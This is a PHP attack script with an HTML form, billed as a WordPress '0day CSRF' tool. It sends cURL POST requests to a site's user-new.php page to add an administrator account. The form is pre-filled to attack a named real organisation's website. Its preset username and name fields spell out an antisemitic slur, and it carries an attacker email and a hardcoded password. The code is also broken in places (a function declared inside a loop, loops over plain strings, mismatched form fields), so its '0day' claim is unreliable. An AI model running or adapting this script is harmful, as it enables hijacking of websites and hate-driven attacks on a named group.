<? 
@set_time_limit(0); 
echo "<form method='POST'>
<html>
<title>Wordpress 0day CSRF Brute Add Admin User</title>
<p align='center'> 
<img border='0' src='http://blog.rimuhosting.com/wp-content/uploads/2013/08/wordpress-hacked.png'></p>

<center><font color='#006600' size='4' face='impact'>Wordpress 0day CSRF All Versions By Mauritania Attacker</center></font>
<input type='hidden' name='action' value='createuser'/>
<input type='hidden' name='_wpnonce_create-user' value='code'/>
<input type='hidden' name='_wp_http_referer' value='/wp-admin/user-new.php'/>
<p><center><input type='text' size='30' face='tahoma' name='victim' value='http://www.liguedefensejuive.com'/><font color='RED'> Target Website</center></font>
<p><center><input type='text' size='30' face='tahoma' name='user_login' value='yehudikalb'/>Choose Username To Add</center>
<input type='hidden' name='email' value='zigribambou4@hotmail.fr'/>
<input type='hidden' name='first_name' value='kalb'/>
<input type='hidden' name='last_name' value='yehudi'/>
<input type='hidden' name='url' value='http://google.co.il'/>
<center><input type='text' size='30' face='tahoma' name='pass1' value='lolo133*'/>Choose Password To Add</center>
<center><input type='text' size='30' face='tahoma' name='pass2' value='lolo133*'/>Confirm Password To Add</center></p>
<input type='hidden' name='role' value='administrator'/>
<input type='hidden' name='createuser' value='Add+New+User+'/>
<center><textarea cols='10' rows='6' id='ghost' name='code'></textarea><br></center> 
<p><center><input type='submit' value='Inject wpnonce Token' name='scan'><br><br></center></p>

</form> </html>";

if(isset($_POST)  && !empty($_POST)){

$victim = $_POST['victim'];
$user_login = $_POST['user_login'];
$pass1 = $_POST['pass1'];
$pass2 = $_POST['pass2'];
$curl="http://www.liguedefensejuive.com/wp-admin/user-new.php";
$_wpnonce_create = explode("\n",$_POST['_wpnonce_create-user']);



$user = explode("\r\n", $_POST['code']); 
if($_POST['scan']) 
{ 
foreach($_wpnonce_create as $code) 
{
    
 
function brute($code) {
global $victim,$user_login,$pass1,$pass2,$ch,$curl;

$ch = curl_init(); 
curl_setopt($ch,CURLOPT_URL,"$victim/wp-admin/user-new.php");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/35.0.1916.114"); 
curl_setopt($ch,CURLOPT_POSTFIELDS,"user=$user_login&passi=$pass1&passii=$pass2&_wpnonce_create=code=&redirect_to=.$victim./author/$user_login");

$check = curl_exec($ch);
if(eregi('$user_login',$check)) {
echo "<p><font face='Verdana' size='1'>[+] Username Has Been Successfully Added  : <font color='#008000'>$user_login = $victim</font></p>";
}
		
else 
{ 
echo "<font face='Tahoma' size='2' color='red'> => Incorrect Code Trying More...</font><br>"; 
} 
}

foreach($user_login as $user) {
foreach($pass1 as $passi) {
foreach($pass2 as $passii) {
brute($code);
} 
} 
} 


curl_close($ch); 
} 
} 
}

?>